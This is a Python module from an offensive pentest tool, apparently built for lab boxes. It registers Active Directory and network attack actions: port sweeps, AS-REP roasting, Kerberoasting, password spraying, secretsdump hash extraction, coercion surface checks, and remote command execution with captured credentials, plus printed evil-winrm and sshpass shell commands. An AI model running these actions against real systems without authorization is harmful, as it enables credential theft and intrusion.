"""
The built-in action catalogue — the single place capabilities are registered.

Each handler is a thin adapter that calls an existing p0rtix function and lets it
push facts through `ctx.facts` (a FactStore passed as `runner.ws`, so the legacy
handler bodies emit unlock events with zero changes). Adding a new tool to the
engine is one `register(...)` call here.

The catalogue spans passive parsing, green discovery/anonymous enumeration
(SMB/LDAP), yellow credentialed AD enumeration (domaindump, Kerberoast,
BloodHound, writable objects), and non-interactive access (`access.exec` — one
command, captured stdout). p0rtix stops at recon + enumeration; interactive
shells and exploitation are the exploitation agent's job (see export_handoff).
"""
from __future__ import annotations

import re
from pathlib import Path

from lib import nmap
from lib.engine.action import Action, ActionResult, Footprint, Requirement, Tier
from lib.engine.facts import FactStore, ProtoStatus
from lib.engine.registry import ActionRegistry
from lib.models import Service

_LDAP_PORTS = (389, 636, 3268, 3269)


# ── passive (run at console open; zero packets) ───────────────────────────────
def _h_parse_prior(ctx) -> ActionResult:
    """Load any Service objects from a prior scan's saved nmap XML into facts."""
    found = 0
    for label, proto in (("*_tcp_services.xml", "tcp"), ("*_udp_confirmed.xml", "udp")):
        xml = next(ctx.runner.ws.raw_dir.glob(label), None)
        if xml:
            services = nmap.parse_service_xml(xml, proto)
            if services:
                ctx.facts.set_services(services)
                found += len(services)
    return ActionResult(ok=True, summary=f"loaded {found} service(s) from prior scan")


# ── green: discovery ──────────────────────────────────────────────────────────
# Pure remote-management ports — finding only these means the quick sweep hasn't
# located the box's actual service surface (SSH/RDP are how you log in, not what
# you attack). Every other curated port is a service worth enumerating in place.
_MGMT_ONLY_PORTS = {22, 3389}


def _sparse_surface(ports) -> bool:
    """True when a quick sweep result looks like it missed the box's real surface:
    nothing open, or only remote-management ports. The classic trap is a host that
    answers only on SSH while its whole app lives on an uncommon port (Headless:
    everything was on 5000). Reading that as 'mapped' leaves the operator blind."""
    ports = set(ports)
    return len(ports) <= 2 and not (ports - _MGMT_ONLY_PORTS)


def _h_tcp_quick(ctx) -> ActionResult:
    ports = nmap.discover_tcp_quick(ctx.ip, ctx.runner, ctx.runner.ws)
    ctx.facts.add_scanned_tcp(nmap.QUICK_TCP_PORTS)     # remember coverage
    escalated = False
    if _sparse_surface(ports):
        # Don't declare the surface mapped off a suspiciously empty quick result —
        # escalate to a full -p- sweep (skipping ports already covered) so a box
        # living on an uncommon port isn't missed until the background scan lands.
        ctx.findings.bullet(
            f"Quick sweep sparse ({', '.join(map(str, ports)) or 'none'} — "
            "management ports only) — auto-escalating to a full TCP sweep so the "
            "surface isn't under-mapped")
        exclude = ctx.facts.scanned_tcp()
        more = nmap.discover_tcp_open(ctx.ip, ctx.runner, ctx.runner.ws, exclude=exclude)
        ctx.facts.add_scanned_tcp(range(1, 65536))
        ports = sorted(set(ports) | set(more))
        escalated = True
    for p in ports:
        ctx.facts.add_open_port("tcp", p)
    tag = "quick→full" if escalated else "quick"
    ctx.findings.bullet(f"Open TCP ports ({tag}): {', '.join(map(str, ports)) or 'none'}")
    return ActionResult(ok=True, summary=f"{len(ports)} open TCP port(s) [{tag}]")


def _h_tcp_common(ctx) -> ActionResult:
    ports = nmap.discover_tcp_common(ctx.ip, ctx.runner, ctx.runner.ws)
    ctx.facts.add_scanned_tcp(nmap.COMMON_TCP_PORTS)
    for p in ports:
        ctx.facts.add_open_port("tcp", p)
    ctx.findings.bullet(f"Open TCP ports (common): {', '.join(map(str, ports)) or 'none'}")
    return ActionResult(ok=True, summary=f"{len(ports)} open TCP port(s) [common]")


def _h_tcp_ports(ctx) -> ActionResult:
    # Skip ports an earlier tier already swept — coverage is remembered.
    exclude = ctx.facts.scanned_tcp()
    ports = nmap.discover_tcp_open(ctx.ip, ctx.runner, ctx.runner.ws, exclude=exclude)
    ctx.facts.add_scanned_tcp(range(1, 65536))
    for p in ports:
        ctx.facts.add_open_port("tcp", p)
    extra = f" (excluded {len(exclude)} already-swept)" if exclude else ""
    ctx.findings.bullet(f"Open TCP ports (full{extra}): {', '.join(map(str, ports)) or 'none'}")
    return ActionResult(ok=True, summary=f"{len(ports)} open TCP port(s) [full]")


def _h_udp_ports(ctx) -> ActionResult:
    ports = nmap.discover_udp(ctx.ip, ctx.runner, ctx.runner.ws)
    for p in ports:
        ctx.facts.add_open_port("udp", p)
    ctx.findings.bullet(f"Open UDP ports: {', '.join(map(str, ports)) or 'none'}")
    return ActionResult(ok=True, summary=f"{len(ports)} open UDP port(s)")


def _dedup_tcp(ports: set[int]) -> set[int]:
    """Collapse sibling ports that share a service so we don't spawn a useless
    second section: 445 supersedes 139; plaintext LDAP 389 supersedes its
    LDAPS/GC siblings (3268/636/3269); else 636 supersedes GC-LDAPS 3269."""
    drop: set[int] = set()
    if 445 in ports and 139 in ports:
        drop.add(139)
    if 389 in ports:
        drop |= {p for p in (3268, 636, 3269) if p in ports}
    elif 636 in ports and 3269 in ports:
        drop.add(3269)
    return ports - drop


def _open_tcp_ports(facts: FactStore) -> list[dict]:
    tcp = {p for (proto, p) in facts.snapshot()["open_ports"] if proto == "tcp"}
    return [{"port": p} for p in sorted(_dedup_tcp(tcp))]


def _h_version_detect(ctx) -> ActionResult:
    port = ctx.target_port
    services = nmap.version_detect(ctx.ip, [port], ctx.runner, ctx.runner.ws)
    ctx.facts.add_services(services)
    for s in services:
        ctx.findings.bullet(f"{s.proto}/{s.port}: {s.name} {s.version}".rstrip())
        # Seed web_tech from the versioned product so the fingerprint is non-empty
        # the moment a web service is known — not gated on a later full web.enum
        # pass (which then enriches it with whatweb tokens). Keeps the handoff/
        # get_state web_tech populated even if the agent races ahead to export.
        if s.is_web and (s.version or s.name):
            ctx.facts.add_web_tech(s.port, (s.version or s.name).strip())
    return ActionResult(ok=True, summary=f"version-detected {port}")


# ── web + non-AD service enumeration (wraps the existing dispatchers) ──────────
# AD/creds ports are handled by the dedicated smb.*/ldap.*/kerberos.*/creds.*
# branches, so service.enum skips them and only covers the rest.
_AD_PORTS = {88, 139, 445, 389, 636, 3268, 3269, 5985, 5986}


def _find_service(ctx, port):
    for s in ctx.facts.get_services():
        if s.port == port:
            return s
    return None


def _web_instances(f) -> list[dict]:
    return [{"port": s.port} for s in f.get_services() if s.is_web]


def _service_instances(f) -> list[dict]:
    from lib import services
    out = []
    for s in f.get_services():
        if s.is_web or s.port in _AD_PORTS:
            continue
        if services.service_handler(s) is not None:
            out.append({"port": s.port})
    return out


def _h_web_enum(ctx) -> ActionResult:
    from lib.hosts import HostsManager
    from lib.scope import Scope
    from lib.web import enumerate_web
    from lib.wordlists import Breadth, parse_breadth
    svc = _find_service(ctx, ctx.target_port)
    if svc is None:
        return ActionResult(ok=False, summary=f"no web service on port {ctx.target_port}")
    breadth = parse_breadth((ctx.args or {}).get("breadth"),
                            getattr(ctx.facts, "breadth", Breadth.STANDARD))
    # BROAD subsumes --deep: run the extra cewl/arjun/API passes too.
    deep = getattr(ctx.facts, "deep", False) or breadth is Breadth.BROAD
    scope = Scope(ctx.ip, ctx.domain)
    discoveries = enumerate_web(
        ctx.ip, svc, ctx.domain, ctx.runner, ctx.findings, scope, HostsManager(),
        ctx.available, is_followup=False, deep=deep, breadth=breadth,
    ) or []
    for d in discoveries:
        if getattr(d, "hostname", ""):
            ctx.facts.add_hostname(d.hostname)
    return ActionResult(ok=True,
                        summary=f"web enum {svc.scheme}://{ctx.ip}:{svc.port} "
                                f"({len(discoveries)} discovery)")


def _h_artifact_secrets(ctx) -> ActionResult:
    """Download artifacts (.jar/.zip/.war/.config/.sql/…) from a web service and
    scan them for credential literals, emitting hits as cred candidates for the
    cross-protocol reuse spray (Blocky: foothold cred lived inside a .jar)."""
    from lib.web import scan_web_artifacts
    from lib.wordlists import Breadth, parse_breadth
    svc = _find_service(ctx, ctx.target_port)
    if svc is None:
        return ActionResult(ok=False, summary=f"no web service on port {ctx.target_port}")
    from lib.web import _build_url
    base_url = _build_url(svc.scheme, svc.hostname or ctx.ip, svc.port)
    breadth = parse_breadth((ctx.args or {}).get("breadth"),
                            getattr(ctx.facts, "breadth", Breadth.STANDARD))
    n = scan_web_artifacts(base_url, ctx.runner, ctx.findings, ctx.available, breadth)
    return ActionResult(ok=True, summary=f"artifact scan {base_url} — {n} credential literal(s)")


def _h_service_enum(ctx) -> ActionResult:
    from lib import services
    svc = _find_service(ctx, ctx.target_port)
    if svc is None:
        return ActionResult(ok=False, summary=f"no service on port {ctx.target_port}")
    discoveries = services.enumerate_service(
        ctx.ip, svc, ctx.runner, ctx.findings, ctx.available) or []
    for d in discoveries:
        if getattr(d, "hostname", ""):
            ctx.facts.add_hostname(d.hostname)
    return ActionResult(ok=True, summary=f"{svc.name} enum on {svc.proto}/{svc.port}")


def _h_ike_enum(ctx) -> ActionResult:
    """IKE/IPsec (ISAKMP udp/500): main-mode fingerprint + aggressive-mode probe.
    Mines the disclosed ID payload into user/domain facts and captures the PSK
    hash for offline crack.hashes (psk-crack)."""
    from lib import ike
    res = ike.enumerate_ike(ctx.ip, ctx.runner, ctx.findings, ctx.available)
    if res.get("aggressive"):
        bits = []
        if res.get("id"):
            bits.append(f"ID {res['id'].get('value', '')}")
        if res.get("psk_captured"):
            bits.append("PSK captured")
        return ActionResult(ok=True, summary="IKE aggressive mode — " + ", ".join(bits or ["leak"]))
    if res.get("main_mode"):
        return ActionResult(ok=True, summary="IKE main mode only (no aggressive-mode leak)")
    return ActionResult(ok=True, summary="no ISAKMP response")


# ── green: anonymous SMB / LDAP (wrap existing handler bodies) ─────────────────
def _h_smb_users(ctx) -> ActionResult:
    from lib import services
    services._smb_users(ctx.ip, 445, ctx.runner, ctx.findings, ctx.available)
    return ActionResult(ok=True, summary="SMB users (RID cycle + --users)")


def _h_smb_shares(ctx) -> ActionResult:
    from lib import services
    services._smb_shares(ctx.ip, 445, ctx.runner, ctx.findings, ctx.available)
    return ActionResult(ok=True, summary="SMB share access")


def _h_smb_spider(ctx) -> ActionResult:
    from lib import services
    services._smb_spider_shares(ctx.ip, 445, ctx.runner, ctx.findings, ctx.available)
    return ActionResult(ok=True, summary="SMB share spidering")


def _h_smb_policy(ctx) -> ActionResult:
    from lib import services
    services._smb_policy(ctx.ip, 445, ctx.runner, ctx.findings, ctx.available)
    return ActionResult(ok=True, summary="SMB password/lockout policy")


def _ldap_port(facts: FactStore) -> int | None:
    for p in _LDAP_PORTS:
        if facts.has(f"tcp/{p}"):
            return p
    return None


def _ldap_svc(ctx) -> Service:
    port = _ldap_port(ctx.facts) or 389
    return Service(port=port, proto="tcp", name="ldap", version="",
                   is_web=False, scheme="", hostname=ctx.domain or "")


def _h_ldap_domain_info(ctx) -> ActionResult:
    from lib import services
    services._ldap_domain_info(ctx.ip, _ldap_svc(ctx), ctx.runner, ctx.findings, ctx.available)
    return ActionResult(ok=True, summary="LDAP domain info (base DN, policy, computers)")


def _h_ldap_users(ctx) -> ActionResult:
    from lib import services
    services._ldap_users(ctx.ip, _ldap_svc(ctx), ctx.runner, ctx.findings, ctx.available)
    # If anonymous bind yielded nothing, mark the branch dormant until a cred.
    if not ctx.facts.has("users") and not ctx.facts.has("domain"):
        ctx.facts.set_proto_status("ldap", ProtoStatus.ANON_DENIED)
    return ActionResult(ok=True, summary="LDAP users + AS-REP-roastable")


def _h_ldap_groups(ctx) -> ActionResult:
    from lib import services
    services._ldap_groups(ctx.ip, _ldap_svc(ctx), ctx.runner, ctx.findings, ctx.available)
    return ActionResult(ok=True, summary="LDAP groups + privileged accounts")


def _h_ldap_delegation(ctx) -> ActionResult:
    from lib import services
    services._ldap_delegation(ctx.ip, _ldap_svc(ctx), ctx.runner, ctx.findings, ctx.available)
    return ActionResult(ok=True, summary="LDAP delegation surface")


# ── yellow: AS-REP roast (unlocked by domain + a user list) ───────────────────
def _ensure_users_file(facts: FactStore) -> Path:
    """Return loot/users.txt, materialising it from the fact store if add_user
    has not already written it (e.g. users seeded purely in memory)."""
    path = facts.loot_dir / "users.txt"
    if not path.exists() or path.stat().st_size == 0:
        users = facts.snapshot()["users"]
        path.write_text("\n".join(users) + ("\n" if users else ""))
    return path


def _ulabel(user: str) -> str:
    """A filesystem-safe short slug for a username (for raw-output filenames)."""
    return re.sub(r"[^a-z0-9]", "_", user.lower())[:24]


def _register_hashes(facts, kind: str, lines) -> int:
    """Record each captured hash line under its principal (so the UI can show
    uncracked→crack / cracked→plaintext, keyed by account)."""
    from lib.workspace import Workspace
    n = 0
    for line in lines:
        if line.strip():
            facts.add_hash(kind, Workspace._krb_principal(line))
            n += 1
    return n


def _h_userenum(ctx) -> ActionResult:
    """Validate the user list against the KDC with kerbrute. Most useful for
    seeded/OSINT names — directory-sourced users are already confirmed."""
    domain = ctx.facts.discovered_domain or ctx.domain
    if not domain:
        return ActionResult(ok=False, summary="no domain known")
    users_file = _ensure_users_file(ctx.facts)
    cmd = ["kerbrute", "userenum", "--dc", ctx.ip, "-d", domain, str(users_file)]
    ctx.findings.cmd(" ".join(cmd))
    out = ctx.runner.run(cmd, "kerb_userenum", timeout=300)
    valid = re.findall(r"VALID USERNAME:\s+(\S+)", out)
    for u in valid:
        ctx.facts.add_user(u.split("@")[0], authoritative=True)
    if valid:
        ctx.findings.bullet(f"**kerbrute confirmed {len(valid)} user(s):** "
                            + ", ".join(sorted({u.split('@')[0] for u in valid})))
    return ActionResult(ok=True, summary=f"{len(valid)} user(s) confirmed")


def _h_asrep_roast(ctx) -> ActionResult:
    domain = ctx.facts.discovered_domain or ctx.domain
    if not domain:
        return ActionResult(ok=False, summary="no domain known")
    users_file = _ensure_users_file(ctx.facts)
    cmd = [
        "impacket-GetNPUsers", f"{domain}/", "-no-pass", "-dc-ip", ctx.ip,
        "-request", "-format", "hashcat", "-usersfile", str(users_file),
    ]
    ctx.findings.cmd(" ".join(cmd))
    out = ctx.runner.run(cmd, "kerb_asrep_GetNPUsers", timeout=180)
    lines = [l.strip() for l in out.splitlines() if "$krb5asrep$" in l]
    if lines:
        ctx.facts.append_krb_hashes("asrep.hash", lines)
        ctx.findings.bullet("**AS-REP roastable hash(es) found — crack with `hashcat -m 18200`**")
        ctx.findings.code_block("\n".join(lines))
        ctx.findings.add_summary("**AS-REP hash(es) in `loot/asrep.hash`** — crack: `hashcat -m 18200`")
        _register_hashes(ctx.facts, "asrep", lines)
        return ActionResult(ok=True, summary=f"{len(lines)} AS-REP hash(es) captured")
    ctx.facts.set_proto_status("kerberos", ProtoStatus.EXHAUSTED)
    return ActionResult(ok=True, summary="no AS-REP roastable accounts")


# ── passive: offline crack (local hashcat; zero packets to target) ────────────
def _h_crack(ctx) -> ActionResult:
    from lib import crack
    from lib.wordlists import parse_breadth
    breadth = parse_breadth((ctx.args or {}).get("breadth"),
                            getattr(ctx.facts, "breadth", None))
    cracked = crack.crack_hashes(ctx.facts, ctx.runner, ctx.findings, ctx.available, breadth)
    # Record each cracked (user, password) as a targeted pair so creds.test can
    # verify it as itself instead of spraying it, and flip the hash to cracked.
    for user, password in cracked:
        if user:
            ctx.facts.add_cred_pair(user, password)
            ctx.facts.mark_hash_cracked(user, password)
    if cracked:
        return ActionResult(ok=True, summary=f"cracked {len(cracked)} password(s)")
    return ActionResult(ok=True, summary="no hashes cracked")


# ── yellow: credential spray (validate candidate passwords → valid_cred) ──────
def _h_creds_spray(ctx) -> ActionResult:
    import p0rtix                                   # late import (avoids cycle)
    open_tcp = [p for (proto, p) in ctx.facts.snapshot()["open_ports"] if proto == "tcp"]
    services = [Service(port=p, proto="tcp", name="", version="", is_web=False,
                        scheme="", hostname="") for p in open_tcp]
    before = len(ctx.facts.snapshot()["valid_creds"])
    p0rtix._run_cred_reuse(ctx.ip, ctx.runner, ctx.findings, ctx.facts,
                           services, ctx.available)
    gained = len(ctx.facts.snapshot()["valid_creds"]) - before
    return ActionResult(ok=True, summary=f"{gained} new valid credential(s)")


# ── yellow: authenticated AD core (unlocked by a valid credential) ────────────
def _pick_enum_cred(facts: FactStore) -> tuple[str, str] | None:
    """Choose a valid credential to enumerate with — prefer a real user account
    over a machine account ($)."""
    valids = facts.snapshot()["valid_creds"]
    for u, p in valids:
        if not u.endswith("$"):
            return (u, p)
    return valids[0] if valids else None


def _enum_cred_or_none(ctx):
    """(domain, user, pw) for authenticated enum, or None if not ready."""
    domain = ctx.facts.discovered_domain or ctx.domain
    cred = _pick_enum_cred(ctx.facts)
    if not domain or cred is None:
        return None
    return domain, cred[0], cred[1]


def _h_ldap_domaindump(ctx) -> ActionResult:
    from lib import credsmode
    ready = _enum_cred_or_none(ctx)
    if ready is None:
        return ActionResult(ok=False, summary="need a domain and a valid credential")
    domain, user, pw = ready
    credsmode._ad_ldapdomaindump(ctx.ip, domain, user, pw, ctx.runner,
                                 ctx.findings, ctx.facts, ctx.available)
    credsmode._ad_enrichment(ctx.ip, domain, user, pw, ctx.runner,
                             ctx.findings, ctx.facts, ctx.available)
    ctx.facts.set_proto_status("ldap", ProtoStatus.EXHAUSTED)
    return ActionResult(ok=True, summary=f"LDAP domain dump as {user}")


def _h_kerberoast(ctx) -> ActionResult:
    from lib import credsmode
    ready = _enum_cred_or_none(ctx)
    if ready is None:
        return ActionResult(ok=False, summary="need a domain and a valid credential")
    domain, user, pw = ready
    credsmode.sync_clock(ctx.ip, ctx.runner, ctx.findings, ctx.available)
    n = credsmode._ad_kerberoast(ctx.ip, domain, user, pw, ctx.runner,
                                 ctx.findings, ctx.facts, ctx.available)
    if n:
        kfile = ctx.facts.loot_dir / "kerberoast.hash"
        lines = kfile.read_text().splitlines() if kfile.exists() else []
        _register_hashes(ctx.facts, "kerberoast",
                         [l for l in lines if "$krb5tgs$" in l])
    return ActionResult(ok=True, summary=f"{n} kerberoastable hash(es)")


def _h_bloodhound(ctx) -> ActionResult:
    from lib import credsmode
    ready = _enum_cred_or_none(ctx)
    if ready is None:
        return ActionResult(ok=False, summary="need a domain and a valid credential")
    domain, user, pw = ready
    zip_path = credsmode._ad_bloodhound(ctx.ip, domain, user, pw, ctx.runner,
                                        ctx.findings, ctx.facts, ctx.available)
    return ActionResult(ok=True,
                        summary=f"bloodhound: {zip_path.name if zip_path else 'no data'}")


def _h_writable_objects(ctx) -> ActionResult:
    from lib import credsmode
    ready = _enum_cred_or_none(ctx)
    if ready is None:
        return ActionResult(ok=False, summary="need a domain and a valid credential")
    domain, user, pw = ready
    targets = credsmode._bloodyad_writable(ctx.ip, domain, user, pw, ctx.runner,
                                           ctx.findings, ctx.facts, ctx.available)
    return ActionResult(ok=True, summary=f"{len(targets or [])} writable object(s)")


def _h_secretsdump(ctx) -> ActionResult:
    from lib import credsmode
    ready = _enum_cred_or_none(ctx)
    if ready is None:
        return ActionResult(ok=False, summary="need a domain and a valid credential")
    domain, user, pw = ready
    n = credsmode._ad_secretsdump(ctx.ip, domain, user, pw, ctx.runner,
                                  ctx.findings, ctx.facts, ctx.available)
    return ActionResult(ok=True, summary=f"{n} NTLM hash(es) via secretsdump")


# ── recon-completeness: relay/coercion surface, ADCS + MSSQL enumeration ──────
def _h_smb_signing(ctx) -> ActionResult:
    """Check SMB signing posture. signing:False → an NTLM-relay target, recorded
    as a fact so it rides along in export_handoff for the exploitation agent."""
    if "nxc" not in ctx.available:
        return ActionResult(ok=False, summary="nxc not available")
    out = ctx.runner.run(["nxc", "smb", ctx.ip], "smb_signing", timeout=60)
    ctx.findings.h4("SMB Signing")
    ctx.findings.code_block(out)
    m = re.search(r"[sS]igning:(True|False)", out)
    if m and m.group(1) == "False":
        ctx.facts.set_smb_signing(False)
        ctx.findings.bullet("**SMB signing NOT required — NTLM relay (ntlmrelayx) "
                            "viable; flagged as a relay target for the handoff**")
        ctx.findings.add_summary("SMB signing NOT required — relay target")
        return ActionResult(ok=True, summary="signing NOT required — relay target")
    if m and m.group(1) == "True":
        ctx.facts.set_smb_signing(True)
        ctx.findings.bullet("SMB signing required — relay not viable")
        return ActionResult(ok=True, summary="signing required")
    return ActionResult(ok=True, summary="signing status unknown")


# Known NTLM-coercion RPC interface UUIDs, by technique.
_COERCE_MARKERS = {
    "MS-RPRN (PrinterBug)":   ("12345678-1234-abcd-ef00-0123456789ab",),
    "MS-EFSR (PetitPotam)":   ("c681d488-d850-11d0-8c52-00c04fd90f7e",
                               "df1941c5-fe89-4e79-bf10-463657acf44d"),
    "MS-DFSNM (DFSCoerce)":   ("4fc742e0-4a10-11cf-8273-00aa004ae673",),
    "MS-FSRVP (ShadowCoerce)": ("a8e0653c-2744-4389-a61d-7373df8b2292",),
}


def _h_coerce_surface(ctx) -> ActionResult:
    """Enumerate exposed NTLM-coercion RPC endpoints (PrinterBug/PetitPotam/
    DFSCoerce/ShadowCoerce) via rpcdump. Recon only — relaying is the agent's job."""
    if "impacket-rpcdump" not in ctx.available:
        return ActionResult(ok=False, summary="impacket-rpcdump not available")
    out = ctx.runner.run(["impacket-rpcdump", ctx.ip], "coerce_rpcdump", timeout=120).lower()
    surface = [name for name, uuids in _COERCE_MARKERS.items()
               if any(u in out for u in uuids)]
    ctx.findings.h4("NTLM Coercion Surface (impacket-rpcdump)")
    if surface:
        for s in surface:
            ctx.findings.bullet(f"**Coercion endpoint exposed: {s}**")
            ctx.findings.add_summary(f"Coercion surface: {s}")
        ctx.findings.note("Relay to a signing-disabled host (ntlmrelayx/metasploit) "
                          "— coercion + relay is the exploitation agent's job")
    else:
        ctx.findings.bullet("No known coercion endpoints detected")
    return ActionResult(ok=True, summary=f"{len(surface)} coercion endpoint(s)")


def _h_adcs_enum(ctx) -> ActionResult:
    """Enumerate vulnerable ADCS certificate templates (certipy-ad find). Recon
    only — the ESC request/auth exploitation chains stay with the agent."""
    from lib import credsmode
    ready = _enum_cred_or_none(ctx)
    if ready is None:
        return ActionResult(ok=False, summary="need a domain and a valid credential")
    if "certipy-ad" not in ctx.available:
        return ActionResult(ok=False, summary="certipy-ad not available")
    domain, user, pw = ready
    cmd = ["certipy-ad", "find", "-u", f"{user}@{domain}", "-p", pw,
           "-dc-ip", ctx.ip, "-stdout", "-vulnerable"]
    ctx.findings.h4("ADCS Templates (certipy-ad find)")
    ctx.findings.cmd(" ".join(cmd))
    out = ctx.runner.run(cmd, f"adcs_find_{_ulabel(user)}", timeout=180)
    ctx.findings.code_block(credsmode._trim(out))
    vuln = credsmode._parse_adcs_find(out)
    for ca, tmpl, esc in vuln:
        ctx.findings.bullet(f"**ADCS {esc}: `{tmpl}` via `{ca}`**")
        ctx.findings.add_summary(f"ADCS {esc}: {tmpl} via {ca}")
    return ActionResult(ok=True, summary=f"{len(vuln)} vulnerable ADCS template(s)")


def _h_mssql_enum(ctx) -> ActionResult:
    """Authenticated MSSQL enumeration — databases + linked servers (lateral-move
    surface). Recon only: no xp_cmdshell (that's access.exec / the agent)."""
    if "nxc" not in ctx.available:
        return ActionResult(ok=False, summary="nxc not available")
    cred = _pick_enum_cred(ctx.facts)
    if cred is None:
        return ActionResult(ok=False, summary="need a valid credential")
    user, pw = cred
    domain = ctx.facts.discovered_domain or ctx.domain
    base = ["nxc", "mssql", ctx.ip, "-u", user, "-p", pw]
    if domain:
        base += ["-d", domain]
    ctx.findings.h4("MSSQL Enumeration (authenticated)")
    queries = {
        "databases": "SELECT name FROM sys.databases",
        "linked servers": "EXEC sp_linkedservers",
    }
    for label, q in queries.items():
        cmd = base + ["-q", q]
        ctx.findings.cmd(" ".join(cmd))
        out = ctx.runner.run(cmd, f"mssql_{label.split()[0]}_{_ulabel(user)}", timeout=90)
        ctx.findings.code_block(out)
    return ActionResult(ok=True, summary=f"MSSQL enum as {user}")


# ── yellow: credential access test (verify pairs as-is — no spray) ────────────
def _h_creds_test(ctx) -> ActionResult:
    """Test each known credential pair (cracked pairs + confirmed valid creds)
    against the open auth services as that exact (user, pass) — verification, not
    a user-list spray. Confirmed access is recorded and a handoff command shown."""
    snap = ctx.facts.snapshot()
    pairs = sorted(set(snap["cred_pairs"]) | set(snap["valid_creds"]))
    if not pairs:
        return ActionResult(ok=False, summary="no credential pairs to test")
    if "nxc" not in ctx.available:
        return ActionResult(ok=False, summary="nxc not available")
    open_tcp = {p for proto, p in snap["open_ports"] if proto == "tcp"}
    domain = ctx.facts.discovered_domain or ctx.domain or ""
    services = [("smb", 445), ("winrm", 5985), ("ssh", 22),
                ("rdp", 3389), ("mssql", 1433)]
    confirmed = 0
    for user, pw in pairs:
        for svc, port in services:
            if port not in open_tcp:
                continue
            cmd = ["nxc", svc, ctx.ip, "-u", user, "-p", pw]
            if domain and svc != "ssh":      # ssh auth isn't domain-scoped
                cmd += ["-d", domain]
            label = re.sub(r"[^a-z0-9]", "_", f"{svc}_{user}".lower())[:24]
            out = ctx.runner.run(cmd, f"credtest_{label}", timeout=60)
            for line in out.splitlines():
                if "[+]" not in line:
                    continue
                confirmed += 1
                if "Pwn3d!" in line:
                    ctx.facts.add_admin_cred(user, pw)
                    ctx.findings.bullet(f"**ADMIN access ({svc}):** `{user}` — {line.strip()}")
                    ctx.findings.add_summary(f"**Admin {svc.upper()} as `{user}`**")
                else:
                    ctx.facts.add_valid_cred(user, pw, svc.upper())
                    ctx.findings.bullet(f"**Valid {svc} access:** `{user}` — {line.strip()}")
                if svc == "winrm":
                    ctx.findings.add_summary(
                        f"WinRM shell handoff: `evil-winrm -i {ctx.ip} -u {user} -p {pw}`")
                elif svc == "ssh":
                    ctx.findings.add_summary(
                        f"SSH shell handoff: `sshpass -p '{pw}' ssh {user}@{ctx.ip}`")
                break
    return ActionResult(ok=True,
                        summary=f"tested {len(pairs)} pair(s) — {confirmed} access hit(s)")


# ── access: run ONE command non-interactively (no shell, no C2) ───────────────
def _h_exec(ctx) -> ActionResult:
    """Run a single command non-interactively via the best available credential
    and capture stdout. The command comes from ``ctx.args["command"]``. This is a
    recon-grade access check / quick command — NOT an interactive shell. Anything
    beyond a one-shot command is the exploitation agent's job (see export_handoff)."""
    from lib.engine import access
    command = (ctx.args or {}).get("command", "").strip()
    if not command:
        return ActionResult(ok=False, summary="no command given (pass args.command)")
    if "nxc" not in ctx.available and "sshpass" not in ctx.available:
        return ActionResult(ok=False, summary="need nxc or sshpass to exec")
    cmd = access.exec_command(ctx.facts, ctx.ip, command)
    if cmd is None:
        return ActionResult(ok=False,
                            summary="no admin-SMB / WinRM / SSH credential to exec")
    out = ctx.runner.run(cmd, "access_exec", timeout=120)
    ctx.findings.h4(f"access.exec — `{command}`")
    ctx.findings.cmd(" ".join(cmd))
    ctx.findings.code_block(out)
    ctx.findings.add_summary(f"exec `{command}` via {cmd[0]} {cmd[1] if len(cmd) > 1 else ''}".strip())
    return ActionResult(ok=True, summary=f"exec `{command}` via {cmd[0]}")


# Auth surfaces a candidate password / pair can be tested against. SMB/WinRM are
# the Windows surfaces; SSH (22) is the one the cross-protocol reuse spray needs
# for Linux boxes (Blocky/Expressway reused a recovered secret as the SSH password);
# RDP/MSSQL round out the common login services.
_AUTH_SURFACE_PORTS = (445, 5985, 5986, 22, 3389, 1433)


def _auth_surface(f) -> bool:
    """True if any login service the spray/test can reach is open."""
    return any(f.has(f"tcp/{p}") for p in _AUTH_SURFACE_PORTS)


def _can_exec(f) -> bool:
    # only advertise when a command is actually runnable: admin over SMB, or a
    # valid cred over WinRM (5985/5986) / SSH.
    admin_smb = f.has("admin_cred") and f.has("tcp/445")
    winrm = f.has("valid_cred") and (f.has("tcp/5985") or f.has("tcp/5986"))
    ssh = f.has("valid_cred") and f.has("tcp/22")
    return admin_smb or winrm or ssh


def build_registry() -> ActionRegistry:
    reg = ActionRegistry()

    reg.register(Action(
        "recon.parse_prior", Tier.PASSIVE, _h_parse_prior,
        group="discovery", order=0,
        footprint=Footprint(summary="reads saved nmap XML (local only)"),
        gate=lambda f: any(f.machine_dir.joinpath("raw").glob("*_services.xml")),
    ))

    reg.register(Action(
        "discovery.tcp_quick", Tier.GREEN, _h_tcp_quick,
        group="discovery", order=1,
        footprint=Footprint(
            summary="quiet curated SYN sweep — AD + common web/app ports (~60); "
                    "auto-escalates to a full -p- sweep on a management-only result",
            network="small SYN sweep — lower IDS footprint than -p-",
        ),
        deps=("nmap",),
    ))
    reg.register(Action(
        "discovery.tcp_common", Tier.GREEN, _h_tcp_common,
        group="discovery", order=2,
        footprint=Footprint(
            summary="quiet curated SYN sweep — common internal services (Linux/web/db)",
            network="small SYN sweep — lower IDS footprint than -p-",
        ),
        deps=("nmap",),
    ))
    reg.register(Action(
        "discovery.tcp_ports", Tier.GREEN, _h_tcp_ports,
        group="discovery", order=3,
        footprint=Footprint(
            summary="full TCP SYN sweep (skips ports an earlier tier already swept)",
            network="SYN sweep — firewall connection logs / IDS port-scan signature",
        ),
        deps=("nmap",),
    ))
    reg.register(Action(
        "discovery.udp_top100", Tier.GREEN, _h_udp_ports,
        group="discovery", order=4,
        footprint=Footprint(summary="top-100 UDP sweep",
                            network="UDP probes — firewall/IDS"),
        deps=("nmap",),
    ))
    reg.register(Action(
        "svc.version_detect", Tier.GREEN, _h_version_detect,
        group="discovery", order=5,
        footprint=Footprint(summary="per-port -sV banner grab",
                            network="extra connection + banner grab per port"),
        gate=lambda f: bool(_open_tcp_ports(f)),
        instances=_open_tcp_ports,
        requires=(Requirement("open_tcp", "an open TCP port"),),
        deps=("nmap",),
    ))

    # Web enumeration — one instance per detected HTTP(S) service. Wraps the full
    # web.py pipeline (fingerprint, sensitive files, app probes, SSL SANs, dir/
    # vhost busting). Needs svc.version_detect to have classified the service.
    reg.register(Action(
        "web.enum", Tier.GREEN, _h_web_enum,
        group="web", order=1,
        footprint=Footprint(
            summary="HTTP(S) enumeration — fingerprint, headers, sensitive files, "
                    "app probes, SSL SANs, dir/vhost busting (ffuf)",
            network="dir/vhost busting issues many requests — visible in web logs"),
        gate=lambda f: any(s.is_web for s in f.get_services()),
        instances=_web_instances,
        requires=(Requirement("service", "a detected web service (run svc.version_detect)"),),
        deps=("curl",),
